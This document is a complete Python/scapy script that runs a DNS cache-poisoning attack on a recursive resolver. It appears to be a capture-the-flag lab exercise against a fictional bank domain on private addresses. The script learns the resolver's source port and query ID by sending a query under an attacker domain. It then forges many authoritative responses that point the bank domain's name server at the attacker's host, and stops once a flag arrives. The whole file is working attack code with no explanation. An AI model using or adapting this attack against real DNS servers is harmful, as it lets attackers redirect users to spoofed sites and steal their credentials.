#!/usr/bin/python3

import random
import socket
from scapy.all import *
from scapy.layers.dns import *

'''############################## Setup ##############################'''

dnsAddr = "192.168.56.101"              # Recursive DNS IP address
dnsPort = 0                             # Recursive DNS source port
dnsQID = 0                              # Recursive DNS query ID
domainPort = 53                         # Standard DNS port
dnsServer = (dnsAddr, domainPort)

nsAddr = "10.0.0.1"                     # Name Server IP address
nameServer = "ns.bankofallan.co.uk."    # Name Server Host name
domainSpoof = "bankofallan.co.uk"       # Domain to spoof

badguyAddr = "192.168.56.104"           # Attacker IP address
badguyPort = 55553                      # Attacker source port
badguyDomain = "badguy.ru"              # Bad guy domain
badguyClient = (badguyAddr, badguyPort)

flagPort = 1337                         # UDP port on which receiving the flag
numOfAttempts = 10                      # Poisoning attempts (10 default)
qIDrange = 30                           # Guessed QID range (30 default)

'''############################ End setup ############################'''

# Random sub-domain under badguy.ru
query1 = 'www' + str(random.randint(1, 500)) + "." + badguyDomain + "."

# Random sub-domain under bankofallan.co.uk domain
query2 = 'www' + str(random.randint(1, 500)) + "." + domainSpoof + "."

# Socket for sniffing recursive dns query
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(badguyClient)

# Raw socket for sending custom bogus responses
rawSock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
rawSock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)

# Socket for sniffing the flag
sockF = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sockF.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sockF.settimeout(0.000005)
sockF.bind((badguyAddr, flagPort))

stopAttack = False

# Try n times poisoning
for i in range(numOfAttempts):

    # Send DNS query under badguy.ru domain
    qry = IP(src=badguyAddr, dst=dnsAddr) / \
          UDP(sport=badguyPort, dport=domainPort) / \
          DNS(id=random.randint(1, 5000), qr=0, opcode="QUERY", rd=1, qdcount=1,
              qd=(DNSQR(qname=query1, qtype="A", qclass="IN")))
    rawSock.sendto(raw(qry), dnsServer)

    # Sniff recursive dns query
    (res, addr) = sock.recvfrom(2048)
    if addr[1] != 53:
        dnsQID = DNS(res).id
        dnsPort = addr[1]
    print("[{}] Query ID: ".format(i+1) + str(dnsQID) + " Port: " + str(dnsPort))

    ress = []               # List of fake responses
    rmin = dnsQID           # min qid
    rmax = rmin + qIDrange  # max qid

    '''
    Create custom fake Name Server responses
    qid: query ID
    qr: DNS response
    aa: authoritative answer
    rcode: no error
    qdcount: num of questions
    ancount: num of answer
    nscount: num of ns records
    arcount: num of additional records
    '''
    for qid in range(rmin, rmax):
        res = IP(src=nsAddr, dst=dnsAddr) / \
              UDP(sport=53, dport=dnsPort) / \
              DNS(id=qid, qr=1, aa=0, rcode=0, qdcount=1, ancount=0, nscount=1, arcount=1,
                  qd=(DNSQR(qname=query2, qtype="A", qclass="IN")),
                  an=None,
                  ns=(DNSRR(rrname=domainSpoof, type="NS", rclass="IN", ttl=60000, rdlen=22, rdata=nameServer)),
                  ar=(DNSRR(rrname=nameServer, type="A", rclass="IN", ttl=36000, rdlen=4, rdata=badguyAddr)))

        rawRes = raw(res)
        ress.append(rawRes)

    # Send DNS query under bankofallan.co.uk domain
    query2pkt = IP(src=badguyAddr, dst=dnsAddr) / \
                UDP(dport=53) / \
                DNS(id=random.randint(1, 5000), qr=0, opcode="QUERY", rd=1, qdcount=1,
                    qd=(DNSQR(qname=query2, qtype="A", qclass="IN")))
    rawSock.sendto(raw(query2pkt), dnsServer)

    # Send fake responses
    for p in ress:
        rawSock.sendto(p, (dnsAddr, dnsPort))
        try:
            data = sockF.recvfrom(2048)
        except socket.timeout:
            continue
        if len(data[0]) > 0:
            stopAttack = True
            print('\nFlag: ' + str(data[0].decode()))
            break
        else:
            continue
    if stopAttack:
        rawSock.close()
        sockF.close()
        sock.close()
        break

if stopAttack:
    print('\nPoisoning succeeded !!')
else:
    print('\nCache poisoning failed after {} tries !!'.format(numOfAttempts))
